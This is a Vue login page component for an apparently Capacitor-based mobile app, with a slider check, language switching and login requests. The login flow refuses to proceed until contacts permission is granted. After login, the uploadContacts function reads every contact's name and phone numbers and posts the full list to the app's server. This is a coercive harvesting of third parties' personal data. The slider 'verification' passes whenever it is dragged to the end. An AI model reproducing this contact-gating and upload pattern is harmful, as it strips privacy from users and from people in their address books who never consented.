<template>
  <div class="main"
    style="background: url(../../assets/images/bg.jpg) no-repeat center center; background-size: cover; min-height: 100vh;">
    <div class="register-container">
      <div class="register-all">
        <div class="register-alltop">
          <div class="register-alltopone" @click="showLangPanel = true"
            style="cursor: pointer;user-select: none;">
            <Icon icon="ic:baseline-language" height="20" />
            <div style="margin-left: 5px;">{{ currentLangName }}</div>
          </div>
        </div>

        <h1 class="register-title">{{ $t('login') }}</h1>

        <form class="register-form" @submit.prevent="handleSubmit">
          <div style="font-size: 11px; margin-bottom: 5px; color: #999;text-align: left;">
            {{ $t('inputAccountTip') }}
          </div>
          <div class="form-item">
            <input type="text" v-model="formData.username" class="form-input" :placeholder="$t('username')"
              :class="{ invalid: formError.username }" />
            <p class="error-text" v-if="formError.username">
              {{ formError.username }}
            </p>
          </div>

          <div style="font-size: 11px; margin-bottom: 5px; color: #999;text-align: left;">
            {{ $t('inputPwdTip') }}
          </div>
          <div class="form-item">
            <div style="position: relative">
              <input :type="showPwd ? 'text' : 'password'" v-model="formData.pwd" class="form-input"
                :placeholder="$t('password')" :class="{ invalid: formError.pwd }" />

              <span @click.stop="showPwd = !showPwd"
                style="position: absolute;right: 12px;top: 50%;transform: translateY(-50%);cursor: pointer;z-index: 999;color: #fff;">
                <Icon :icon="showPwd ? 'mdi:eye-off' : 'mdi:eye'" height="20" color="#ffffff" />
              </span>
            </div>
            <p class="error-text" v-if="formError.pwd">
              {{ formError.pwd }}
            </p>
          </div>

          <!-- 滑块验证 -->
          <div class="slider-verify" ref="sliderWrap">
            <div class="slider-block" :style="{ left: sliderLeft + 'px' }" @mousedown="onDragStart"
              @touchstart="onDragStart">
              <Icon icon="mdi:arrow-right" color="#fff" />
            </div>
            <div class="slider-tips">{{ sliderTips }}</div>
          </div>

          <div class="submit-btn" @click="handleSubmit" :disabled="loading">
            {{ loading ? $t('logining') : $t('login') }}
          </div>
          <div style="margin-top: 20px; font-size: 13px; color: #999;cursor: pointer;user-select: none;"
            @click.stop="toRegister">
            {{ $t('registerAccount') }}
          </div>
        </form>
      </div>
    </div>

    <div v-if="showLangPanel" class="language-all" @click="showLangPanel = false">
      <div v-if="showLangPanel" class="language">
        <div class="language-text" @click.stop="chooseLang('en')">{{ $t('english') }}</div>
        <div class="language-text" @click.stop="chooseLang('zh')">{{ $t('traditionalChinese') }}</div>
        <div style="height: 30px"></div>
      </div>
    </div>

    <div v-if="alertVisible" class="custom-modal" @click="alertVisible = false">
      <div class="modal-box" @click.stop>
        <Icon icon="iconoir:xmark" width="58" v-if="!yesno" />
        <Icon icon="iconoir:check" width="58" v-if="yesno" />
        <div class="modal-text">{{ alertMsg }}</div>
      </div>
    </div>

    <!-- 通讯录授权弹窗 -->
    <div class="contact-auth-modal" v-if="showContactModal">
      <div class="modal-mask"></div>
      <div class="auth-content" @click.stop>
        <div class="auth-title">{{ $t('contactAuthTitle') }}</div>
        <div class="auth-desc">{{ $t('contactAuthDesc') }}</div>
        <div class="auth-btn-group">
          <div class="btn-cancel" @click="cancelContactAuth">{{ $t('refuse') }}</div>
          <div class="btn-confirm" @click="doRequestPermission">{{ $t('allow') }}</div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, onUnmounted, onMounted, nextTick } from 'vue'
import { Icon } from '@iconify/vue'
import request from '@/utils/request'
import { useRouter } from 'vue-router'
import { useI18n } from 'vue-i18n'
import { Capacitor } from '@capacitor/core'
// @ts-ignore
import { Contacts } from '@capacitor-community/contacts'
import { updateOperateTime } from '../../utils/authTimeout'

const router = useRouter()
const { t, locale } = useI18n()

interface LoginForm {
  username: string
  pwd: string
}
interface FormError {
  username: string
  pwd: string
}
interface LoginResponse {
  code: number
  type?: string
  user?: any
}

// 基础变量
const yesno = ref(false)
const formData = ref<LoginForm>({ username: '', pwd: '' })
const showPwd = ref<boolean>(false)
const formError = ref<FormError>({ username: '', pwd: '' })
const showLangPanel = ref<boolean>(false)
const loading = ref<boolean>(false)
const alertVisible = ref<boolean>(false)
const alertMsg = ref<string>('')
let autoCloseTimer: any = null

// 通讯录变量
const showContactModal = ref(false)
let userCache: any = null
// 标记：权限弹窗唤起后，是否继续登录
let waitLoginAfterPerm = false

// 滑块变量
const sliderWrap = ref<HTMLDivElement | null>(null)
const sliderLeft = ref(0)
const isDragging = ref(false)
const isVerified = ref(false)
const sliderTips = ref('')
let targetX = 0
let wrapWidth = 0
const blockWidth = 44
const tolerance = 12
let startX = 0

// 提示弹窗
const showToast = (msg: string): void => {
  alertMsg.value = msg
  alertVisible.value = true
  if (autoCloseTimer) clearTimeout(autoCloseTimer)
  autoCloseTimer = setTimeout(() => (alertVisible.value = false), 2000)
}

onUnmounted(() => {
  if (autoCloseTimer) clearTimeout(autoCloseTimer)
  window.removeEventListener('mousemove', onDragMove)
  window.removeEventListener('mouseup', onDragEnd)
  window.removeEventListener('touchmove', onDragMove)
  window.removeEventListener('touchend', onDragEnd)
})

const currentLangName = computed(() => {
  const langMap: Record<string, string> = {
    zh: t('language'),
    en: t('language')
  }
  return langMap[locale.value] || t('language')
})

const chooseLang = (key: string): void => {
  locale.value = key
  localStorage.setItem('lang', key)
  showLangPanel.value = false
}

// 滑块逻辑
const initSlider = async () => {
  await nextTick()
  if (!sliderWrap.value) return
  wrapWidth = sliderWrap.value.offsetWidth
  const maxMove = wrapWidth - blockWidth
  targetX = Math.floor(maxMove * 0.6 + Math.random() * (maxMove * 0.3))
  sliderLeft.value = 0
  isVerified.value = false
  sliderTips.value = t('sliderTipDefault')
}

const onDragStart = (e: MouseEvent | TouchEvent) => {
  if (isVerified.value) return
  isDragging.value = true
  startX = 'touches' in e ? e.touches[0].clientX : e.clientX
}

const onDragMove = (e: MouseEvent | TouchEvent) => {
  if (!isDragging.value || !sliderWrap.value) return
  if ('touches' in e) e.preventDefault()

  const currentX = 'touches' in e ? e.touches[0].clientX : e.clientX
  const diff = currentX - startX
  const maxMove = wrapWidth - blockWidth
  let moveX = diff
  if (moveX <= 0) moveX = 0
  if (moveX >= maxMove) moveX = maxMove
  sliderLeft.value = moveX
}

const onDragEnd = () => {
  if (!isDragging.value) return
  isDragging.value = false
  const maxMove = wrapWidth - blockWidth

  if (Math.abs(sliderLeft.value - targetX) < tolerance || sliderLeft.value >= maxMove - 5) {
    isVerified.value = true
    sliderTips.value = t('sliderTipSuccess')
  } else {
    sliderTips.value = t('sliderTipFail')
    setTimeout(() => {
      sliderLeft.value = 0
      initSlider()
    }, 600)
  }
}

// 表单校验
const validateForm = (): boolean => {
  formError.value = { username: '', pwd: '' }
  let valid = true
  if (!formData.value.username) {
    formError.value.username = t('emptyAccountTip')
    valid = false
  }
  if (!formData.value.pwd) {
    formError.value.pwd = t('emptyPwdTip')
    valid = false
  }
  return valid
}

// 读取并上传通讯录
const uploadContacts = async () => {
  // 非原生APP 或 已上传过 直接跳过
  if (!Capacitor.isNativePlatform() || localStorage.getItem('contacts_uploaded') === '1') {
    return
  }
  if (!userCache?.id) return

  try {
    // 读取全部联系人
    const { contacts } = await Contacts.getContacts({
      projection: {
        name: true,
        phones: true,
        emails: false,
        organization: false
      }
    })
    console.log('获取联系人列表：', contacts)

    const contactList = contacts.map(item => {
      const name = item.name?.display || t('unknownContact')
      const phones = item.phones?.map(p => p.number) || []
      return { name, phones }
    })

    // 上传接口
    await request.post('/api/user/upload-contacts', {
      userId: userCache.id,
      contactList: contactList
    }, { timeout: 10000 })

    localStorage.setItem('contacts_uploaded', '1')
    showToast(t('contactUploadSuccess'))
  } catch (err) {
    console.error('读取/上传联系人失败：', err)
    showToast(t('contactUploadFail'))
  }
}

// 权限检测
const checkContactPermission = async (): Promise<boolean> => {
  if (!Capacitor.isNativePlatform()) return true

  const status = await Contacts.checkPermissions()
  if (status.contacts === 'granted') return true
  if (status.contacts === 'denied') {
    showToast(t('needContactPermSetting'))
    return false
  }
  // 未授权：弹出弹窗，并标记后续继续登录
  waitLoginAfterPerm = true
  showContactModal.value = true
  return false
}

// 拒绝授权
const cancelContactAuth = () => {
  showContactModal.value = false
  waitLoginAfterPerm = false
  showToast(t('refuseContactPermTip'))
}

// 申请通讯录权限（核心修复）
const doRequestPermission = async () => {
  showContactModal.value = false
  const res = await Contacts.requestPermissions()

  if (res.contacts === 'granted') {
    // 授权成功：继续执行登录逻辑
    if (waitLoginAfterPerm) {
      waitLoginAfterPerm = false
      await handleSubmit()
    }
  } else {
    showToast(t('contactPermDeniedTip'))
    waitLoginAfterPerm = false
  }
}

// 登录主逻辑
const handleSubmit = async (): Promise<void> => {
  if (loading.value) return
  // 表单校验
  if (!validateForm()) return
  // 滑块校验
  if (!isVerified.value) {
    showToast(t('needSliderVerify'))
    return
  }

  // 先校验权限
  const hasPermission = await checkContactPermission()
  if (!hasPermission) return

  try {
    loading.value = true
    const { data: res } = await request.post<LoginResponse>('/api/login', {
      username: formData.value.username,
      password: formData.value.pwd,
    })

    if (res.code === 1) {
      const saveUser = JSON.parse(JSON.stringify(res.user))
      localStorage.setItem('user', JSON.stringify(saveUser))
      userCache = saveUser
      updateOperateTime()

      showToast(t('loginSuccess'))
      yesno.value = true
      localStorage.setItem("justLogin", "true")

      // 登录成功后 再读取+上传联系人
      await uploadContacts()

      setTimeout(() => {
        router.push('/index')
      }, 1200)
    } else if (res.code === 200) {
      showToast(t('accountRepeatLogin'))
      yesno.value = false
      initSlider()
    } else {
      showToast(t('loginFailed'))
      yesno.value = false
      initSlider()
    }
  } catch (err) {
    showToast(t('serverErrorTip'))
    initSlider()
  } finally {
    loading.value = false
  }
}

const toRegister = (): void => {
  router.replace({ path: '/register' })
}

onMounted(() => {
  initSlider()
  window.addEventListener('mousemove', onDragMove)
  window.addEventListener('mouseup', onDragEnd)
  window.addEventListener('touchmove', onDragMove)
  window.addEventListener('touchend', onDragEnd)
})
</script>

<style scoped>
@import '../../assets/css/login.css';

/* 授权弹窗 最高层级 */
.contact-auth-modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  z-index: 9999999;
  display: flex;
  align-items: center;
  justify-content: center;
}
.modal-mask {
  position: absolute;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.7);
}
.auth-content {
  width: 85%;
  background: #363636;
  border-radius: 8px;
  color: #fff;
  position: relative;
  z-index: 10;
  overflow: hidden;
}
.auth-title {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  padding: 18px 15px;
  border-bottom: 1px solid #555;
}
.auth-desc {
  padding: 20px 15px;
  font-size: 13px;
  color: #ccc;
  line-height: 1.6;
}
.auth-btn-group {
  display: flex;
  border-top: 1px solid #555;
}
.btn-cancel,
.btn-confirm {
  flex: 1;
  text-align: center;
  padding: 16px 0;
  font-size: 14px;
  cursor: pointer;
  min-height: 50px;
  line-height: 50px;
  -webkit-tap-highlight-color: transparent;
  user-select: none;
}
.btn-cancel {
  color: #999;
  border-right: 1px solid #555;
}
.btn-confirm {
  color: #fa33fa;
}

/* 滑块样式 */
.slider-verify {
  width: 100%;
  height: 44px;
  line-height: 44px;
  background: rgba(255, 255, 255, 0.15);
  border-radius: 50px;
  margin: 20px 0 30px 0;
  position: relative;
  overflow: hidden;
  user-select: none;
}
.slider-block {
  width: 44px;
  height: 100%;
  background: #ef40ff;
  border-radius: 50px;
  display: flex;
  align-items: center;
  justify-content: center;
  position: absolute;
  top: 0;
  left: 0;
  cursor: grab;
  transition: left 0.3s ease;
}
.slider-block:active {
  cursor: grabbing;
  transition: none;
}
.slider-tips {
  position: absolute;
  left: 0;
  top: 0;
  width: 100%;
  text-align: center;
  font-size: 12px;
  color: #eee;
  pointer-events: none;
}
</style>